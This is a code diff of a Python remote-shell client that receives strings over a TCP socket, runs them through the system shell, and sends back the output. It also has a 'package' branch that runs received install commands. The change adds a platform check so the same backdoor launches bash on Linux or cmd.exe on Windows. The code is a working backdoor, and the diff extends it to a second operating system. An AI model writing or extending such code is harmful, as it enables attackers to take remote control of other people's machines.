@@ -3,9 +3,20 @@ from socket import socket, AF_INET, SOCK_STREAM, error
 
 from subprocess import Popen, PIPE
 
-from get_time import sleep
+from sys import platform
+
+from time import sleep
 
 from sys import exit as exitapp
+
+
+def get_platform():
+    if platform.startswith('linux2'):
+        return '/bin/bash'
+    elif platform.startswith('win32'):
+        return 'C:\Windows\System32\cmd.exe'
+    else:
+        exitapp()
 
 buffer_size = 4096
 
@@ -61,7 +72,7 @@ while True:
         if (data == "package"):
             pack_info = sock.recv(buffer_size)
 
-            proc = Popen(pack_info, shell=True, stdin=None, stderr=None, executable="/bin/bash")
+            proc = Popen(pack_info, shell=True, stdin=None, stderr=None, executable=get_platform())
 
             proc.wait()
 
@@ -69,7 +80,7 @@ while True:
 
             command = sock.recv(buffer_size)
 
-            proc = Popen(command, shell=True, stdin=None, stdout=PIPE, stderr=PIPE, executable="/bin/bash")
+            proc = Popen(command, shell=True, stdin=None, stdout=PIPE, stderr=PIPE, executable=get_platform())
 
             out, err = proc.communicate()
 
@@ -80,7 +91,7 @@ while True:
 
         else:
 
-            proc = Popen(data, shell=True, stdin=None, stdout=PIPE, stderr=PIPE, executable="/bin/bash")
+            proc = Popen(data, shell=True, stdin=None, stdout=PIPE, stderr=PIPE, executable=get_platform())
 
             out, err = proc.communicate()
 
